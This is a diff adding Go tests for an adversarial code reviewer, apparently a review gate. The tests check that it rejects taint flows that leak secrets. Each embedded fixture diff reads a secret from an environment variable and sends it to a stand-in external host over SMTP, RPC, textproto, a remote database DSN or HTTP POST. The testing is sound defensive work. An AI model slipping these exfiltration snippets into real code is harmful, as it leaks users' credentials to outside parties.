@@ -3046,6 +3046,286 @@ func TestR14_2_FloatNaN_SelfComparison_Allowed(t *testing.T) {
 	}
 }
 
+func TestR14_3_NetSMTP_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/notifier/smtp.go b/pkg/notifier/smtp.go
++++ b/pkg/notifier/smtp.go
+@@ -1,5 +1,13 @@
+ package notifier
++import (
++	"net/smtp"
++	"os"
++)
++func ExfiltrateEmail() {
++	secret := os.Getenv("SECRET_API_KEY")
++	auth := smtp.PlainAuth("", "user", secret, "mail.external.org")
++	_ = smtp.SendMail("mail.external.org:25", auth, "sender@artix.ai", []string{"leak@external.org"}, []byte("data"))
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected net/smtp secret leak to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
+func TestR14_3_NetRPC_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/rpc/client.go b/pkg/rpc/client.go
++++ b/pkg/rpc/client.go
+@@ -1,5 +1,14 @@
+ package rpc
++import (
++	"net/rpc"
++	"os"
++)
++func CallRemoteRPC() {
++	token := os.Getenv("AUTH_TOKEN")
++	client, _ := rpc.Dial("tcp", "remote-service.org:1234")
++	var reply string
++	_ = client.Call("Service.Exfiltrate", token, &reply)
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected net/rpc secret call to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
+func TestR14_3_NetTextproto_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/proto/client.go b/pkg/proto/client.go
++++ b/pkg/proto/client.go
+@@ -1,5 +1,13 @@
+ package proto
++import (
++	"net/textproto"
++	"os"
++)
++func SendCustomCommand() {
++	pass := os.Getenv("DB_PASSWORD")
++	conn, _ := textproto.Dial("tcp", "custom.service.org:999")
++	_, _ = conn.Cmd("AUTH %s", pass)
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected net/textproto secret command to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
+func TestR14_3_DatabaseSQL_DSN_ExternalHost_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	// 1. Secret in DSN to remote host -> MUST BE REJECTED
+	diffRemote := `diff --git a/pkg/db/db.go b/pkg/db/db.go
++++ b/pkg/db/db.go
+@@ -1,5 +1,12 @@
+ package db
++import (
++	"database/sql"
++	"os"
++)
++func ConnectRemoteDB() {
++	secret := os.Getenv("DB_PASSWORD")
++	dsn := "postgres://admin:" + secret + "@external-db.corp.net:5432/production"
++	db, _ := sql.Open("postgres", dsn)
++	_ = db
++}
++`
+	ctxRemote := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diffRemote,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdictRemote := rev.Evaluate(ctxRemote)
+	if verdictRemote.Approved {
+		t.Fatalf("expected database/sql DSN to remote host with secret to be REJECTED, got approved: %+v", verdictRemote)
+	}
+
+	// 2. Secret in DSN to localhost -> MUST BE APPROVED
+	diffLocal := `diff --git a/pkg/db/db.go b/pkg/db/db.go
++++ b/pkg/db/db.go
+@@ -1,5 +1,12 @@
+ package db
++import (
++	"database/sql"
++	"os"
++)
++func ConnectLocalDB() {
++	secret := os.Getenv("DB_PASSWORD")
++	dsn := "postgres://admin:" + secret + "@localhost:5432/production"
++	db, _ := sql.Open("postgres", dsn)
++	_ = db
++}
++`
+	ctxLocal := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diffLocal,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdictLocal := rev.Evaluate(ctxLocal)
+	if !verdictLocal.Approved {
+		t.Fatalf("expected database/sql DSN to localhost with secret to be APPROVED, got: %+v", verdictLocal)
+	}
+}
+
+func TestR14_3_MethodChain_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/client/builder.go b/pkg/client/builder.go
++++ b/pkg/client/builder.go
+@@ -1,5 +1,19 @@
+ package client
++import (
++	"net/http"
++	"os"
++)
++type RequestBuilder struct {
++	token string
++}
++func NewBuilder() *RequestBuilder { return &RequestBuilder{} }
++func (b *RequestBuilder) WithToken(tok string) *RequestBuilder { b.token = tok; return b }
++func (b *RequestBuilder) Execute() (*http.Response, error) {
++	return http.Post("https://exfiltration.com", "text/plain", nil)
++}
++func SendLeak() {
++	secret := os.Getenv("AUTH_TOKEN")
++	_, _ = NewBuilder().WithToken(secret).Execute()
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected method chain taint flow to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
+func TestR14_3_ReceiverField_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/client/receiver.go b/pkg/client/receiver.go
++++ b/pkg/client/receiver.go
+@@ -1,5 +1,19 @@
+ package client
++import (
++	"net/http"
++	"os"
++	"strings"
++)
++type Client struct {
++	apiKey string
++}
++func (c *Client) SetKey(k string) { c.apiKey = k }
++func (c *Client) Send() {
++	_, _ = http.Post("https://leak.site.com", "text/plain", strings.NewReader(c.apiKey))
++}
++func RunLeak() {
++	c := &Client{}
++	c.SetKey(os.Getenv("SECRET_KEY"))
++	c.Send()
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected receiver field taint flow to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
+func TestR14_3_MapStoreLoad_TaintFlow_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	diff := `diff --git a/pkg/client/map_leak.go b/pkg/client/map_leak.go
++++ b/pkg/client/map_leak.go
+@@ -1,5 +1,16 @@
+ package client
++import (
++	"net/http"
++	"os"
++	"strings"
++)
++func LeakViaMap() {
++	cache := make(map[string]string)
++	secret := os.Getenv("SECRET_TOKEN")
++	cache["credential"] = secret
++	extracted := cache["credential"]
++	_, _ = http.Post("https://leak.org/data", "text/plain", strings.NewReader(extracted))
++}
++`
+	ctx := &ReviewContext{
+		Ctx:  context.Background(),
+		Diff: diff,
+		TestResults: []*sandbox.ExecResult{
+			{Command: "go test ./...", ExitCode: 0},
+		},
+	}
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected map store/load taint flow to be REJECTED, got approved: %+v", verdict)
+	}
+}
+
 
 
 
